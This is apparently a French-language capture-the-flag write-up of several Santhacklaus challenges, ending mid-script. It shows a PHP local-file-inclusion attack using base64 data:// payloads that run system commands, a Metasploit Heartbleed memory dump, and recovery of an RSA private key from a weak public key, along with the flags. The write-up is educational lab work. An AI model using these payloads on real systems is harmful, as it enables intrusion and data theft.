  &lt;p&gt;This website has been created by a fanboy of Jean-Claude Van Damme without any background on security&lt;br /&gt;
Website : https://jeanclaudevd.santhacklaus.xyz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;https://jeanclaudevd.santhacklaus.xyz/robots.txt&lt;/li&gt;
  &lt;li&gt;todo.txt et admin.html (-&amp;gt; 404)&lt;/li&gt;
  &lt;li&gt;todo.txt:
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TO CHECK  Delete the admin page (server crashed while editing) &amp;lt;-----
TO DO     Add a contact page
TO DO     Create a Facebook page
DONE      Watch Bloodsport
DONE      Drink water, regularly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;fichier temporaire de vim ?&lt;/li&gt;
  &lt;li&gt;https://jeanclaudevd.santhacklaus.xyz/.admin.html.swp&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{ID04L0t0f1s0m3tr1cs}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;300-only-numbers-here&quot;&gt;300 Only numbers here&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;I lost my source code file so I don’t remember what this server wants&lt;br /&gt;
Host 	51.75.202.113&lt;br /&gt;
Port 	20002&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 51.75.202.113 20002
Welcome to this challenge &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
You must find a good string
aa
The string must end with &lt;span class=&quot;s2&quot;&gt;&quot;Pinkflood&quot;&lt;/span&gt;
Pinkflood
After treatment, the character b isn&lt;span class=&quot;s1&quot;&gt;'t a number
Pinkfloodesd
The string must end with &quot;Pinkflood&quot;
aaPinkflood
After treatment, the character e isn'&lt;/span&gt;t a number
????
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;on remarque qu’il veut que des nombres, et qu’il refuse les a b c d e f&lt;/li&gt;
  &lt;li&gt;donc système hexa&lt;/li&gt;
  &lt;li&gt;peut-être hash -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;After treatment&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;lequel ? sha ? md5 -&amp;gt; oui&lt;/li&gt;
  &lt;li&gt;trouver une chaine qui se termine par Pinkflood et qui a un md5 avec que des nombres&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;to_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{i}Pinkflood'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;issubset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'md5({to_hash}) = {h}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;


&lt;span class=&quot;c1&quot;&gt;# md5(1140633Pinkflood) = 26062149783494508159682139582576
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 51.75.202.113 20002
Welcome to this challenge &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
You must find a good string
1140633Pinkflood
Congratz!!
Flag : IMTLD&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Brut3F0rc31sTh3N3wBl4ck&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Brut3F0rc31sTh3N3wBl4ck}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;400-be-my-valentine&quot;&gt;400 Be my Valentine&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Take care of your heart (maybe also eyes)
51.75.202.113:1073&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;ssl cert different from others site pages&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;metasploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo  &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443:443 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ~/.msf4:/root/.msf4 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /tmp/msf:/tmp/data remnux/metasploit
metasploitdocker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; msf5 search heartbleed
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; msf5 use auxiliary/scanner/ssl/openssl_heartbleed
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show actions
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;action DUMP
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 51.75.202.113
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RPORT 1073
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TLS_VERSION 1.2
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;VERBOSE &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;400-randomsecretmessage&quot;&gt;400 RandomSecretmessAge&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;We have collected some files from a strange intercepted communication. Can you investigate ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;zip avec fichiers&lt;/li&gt;
  &lt;li&gt;encryptedKey encryptedMessage public.key&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file encryptedMessage
encryptedMessage: openssl enc&lt;span class=&quot;s1&quot;&gt;'d data with salted password
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;il faut donc un password ?&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;public.key
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; PUBLIC KEY-----
MIIBLDANBgkqhkiG9w0BAQEFAAOCARkAMIIBFAKCAQsF5BTDOJhNS33yviCT9/eD
SPqwvCytCVcOQQj43aCYCk9+Zqa4XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyi
e512nvRDZ9o9CvjiB2xI73Bvp773gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60m
euv/DsXtFKwz8B1voj2eFEn37KfHzozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVq
D4Uc90poJbQV07ZBhpDt03Bds9y0/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57U
fadNM0ucvxyRq4b8sGOncPbEcL3NYOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pc
&lt;span class=&quot;nv&quot;&gt;kswbqg9WJS91ZDMCAwEAAQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; PUBLIC KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;la clé parait petite&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;on va utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;RsaCtlTool&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;trouver clé privée&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python2.7 ./RsaCtfTool.py &lt;span class=&quot;nt&quot;&gt;--publickey&lt;/span&gt; ../public.key &lt;span class=&quot;nt&quot;&gt;--private&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEUQIBAAKCAQsF5BTDOJhNS33yviCT9/eDSPqwvCytCVcOQQj43aCYCk9+Zqa4
XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyie512nvRDZ9o9CvjiB2xI73Bvp773
gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60meuv/DsXtFKwz8B1voj2eFEn37KfH
zozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVqD4Uc90poJbQV07ZBhpDt03Bds9y0
/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57UfadNM0ucvxyRq4b8sGOncPbEcL3N
YOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pckswbqg9WJS91ZDMCAwEAAQKCAQsA
jkcjL+i2g9ouvR+7+QpAyRGGi77ukvrGf0sQBKu9qGkm6iVNVe8Aroyrla7Hhuyk
uSwVHlg2JxDWHKpLEMh43PFbG2Fky/Ezer6jnTuJs5b9NOUiEB7TWq2pKZtRLiVz
CAkYMVeT2VHbWOqU7VZr66P/oghvcSUpni5kSACDsIvWJNr5/nUDGBnSnjWMVCF9
W9cpElxop/wiw/1IOg/uYK2xHv5dDCK1yPPsiSj8ZLIT0RUciUSUQmXPQxSa9vIN
4zlRD0AFSLBXo0AiXIF5c/hLTOKeOUD9Q07O8/fkEQz9d7CQIDlwMELKROxk7H6K
y1rtBmo3VHdh/B/CoLpFx93+crmaSOW2WYECBxag/ndYinMCggEEQqTif+tJiKn4
fG5uGuMBVqBnT5YFq6mwa73c6eR5i1jsN0m2wNmnru4dODZn96Y2t58kGnNMrAZr
BqPg/5Hr/P0/p07nv3+KWR1Y2LZwehkKmBcJMRMU7bQeE5jgGutHBN3eVWphGzM0
jg3FQbJyVfEGoL5P8YmbOEnbaPHbtEInOXS587h60ZngGDe4zpjRj9HXq13fSbYi
3LbuJrgqru0E0u/z49PQkQyPwNMTYLFio2ekm23o/inZZAHEHPv86DIZIgJDNa1n
6Vr7qzRMI3c42LIpFUwC0m0elv9Pj6Szd5v5Xv1wzlw7GqIBdGLxM5hVmJMiPhil
721SVCOknEPMj0ECBxNbYnG65qsCggEEJET+K+YOT/1JCddDvwg6Sz3i29Jm5aTl
Kc3bs8MvTuInNHO+rTgHZVGbv2MEtCfWcZp/mJGVca3Qg32ezxhIWZguE00DHRo5
XgR1vQOVNS35sQoga3/aDP/QupOhq6TOMtzYyp2pmZcFjCX8a6PFS/Zvx/2rHmXo
fvrbGUM/cdvq4v8e0IBe/0GCT0vMHUvYCTCH8nCVO9WPJZW9CH+EY00FKhODJUO6
p6Yxehyl2CLR7uJSGHD5s5FtCVtYsvmFC41wVizrDQSBn+NvQh6lLUwOOQjFCR0k
EAdo9X6feyqErZzKW6MMyJIzbGws5H2QjabjNrUklqztad+SRc5cINtZMcECBxBu
&lt;span class=&quot;nv&quot;&gt;4HDBiUQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----

&lt;span class=&quot;c&quot;&gt;# déchiffrer encryptedKey&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python2.7 ./RsaCtfTool.py &lt;span class=&quot;nt&quot;&gt;--publickey&lt;/span&gt; ../public.key &lt;span class=&quot;nt&quot;&gt;--uncipherfile&lt;/span&gt; ../encryptedKey
Clear text : .......... My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y

&lt;span class=&quot;c&quot;&gt;# My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y est sûrement la clé de encryptedMessage&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-aes-256-cbc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; ../encryptedMessage &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; file.txt &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;400-3d-industry-12&quot;&gt;400 3D Industry (1/2)&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;3D Industry is a freshly launched startup which is specialized in 3D printing. The CEO has some doubts about the secured development of the website. Can you prove him that his doubts are well-founded ?&lt;br /&gt;
Lien: https://3d-industry.santhacklaus.xyz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;https://3d-industry.santhacklaus.xyz/index.php?file=services.php&lt;/li&gt;
  &lt;li&gt;on remarque rapidement que la faille peut venir de l’url, peut-être une LFI ?&lt;/li&gt;
  &lt;li&gt;après avoir testé des trucs basiques, rien d’utile&lt;/li&gt;
  &lt;li&gt;par contre le module base64 fonctionne:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo &quot;&lt;/span&gt;yolo&lt;span class=&quot;s2&quot;&gt;&quot;; ?&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
&lt;/span&gt;PD9waHAgZWNobyB5b2xvOyA/Pg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;ce lien affiche bien yolo, le code est donc executé
https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgZWNobyB5b2xvOyA/Pg==&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# on fait un ls avec system()&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls -al&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;); ?&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
&lt;/span&gt;PD9waHAgZWNobyBzeXN0ZW0oImxzIC1hbCIpOyA/Pg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on remarque un dossier .hidden&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# on navigue&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls -al .hidden/this/is/the/path/to/the/flag/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) ?&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PD9waHAgZWNobyBzeXN0ZW0oImxzIC1hbCAuaGlkZGVuL3RoaXMvaXMvdGhlL3BhdGgvdG8vdGhlL2ZsYWcvIikgPz4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on trouve un flag.txt&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat .hidden/this/is/the/path/to/the/flag/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) ?&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
&lt;/span&gt;https://3d-industry.santhacklaus.xyz/index.php?file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;,PD9waHAgZWNobyBzeXN0ZW0oImNhdCAuaGlkZGVuL3RoaXMvaXMvdGhlL3BhdGgvdG8vdGhlL2ZsYWcvZmxhZy50eHQiKSA/Pg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{B3w4r30fURL1nclud3}IMTLD{B3w4r30fURL1nclud3}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;450-jlcsvbd&quot;&gt;450 j.l.c.s.v.b.d&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;You’ll get JCVDed&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;stegsolv rapidement&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;qrcode in the image&lt;/li&gt;
  &lt;li&gt;3 qr code in the pictures, one for each color layer, red, blue, green&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python2
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'challenge.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;lar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hau&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;orig_pix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;bg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'RGB'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hau&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'white'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;bg_pix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
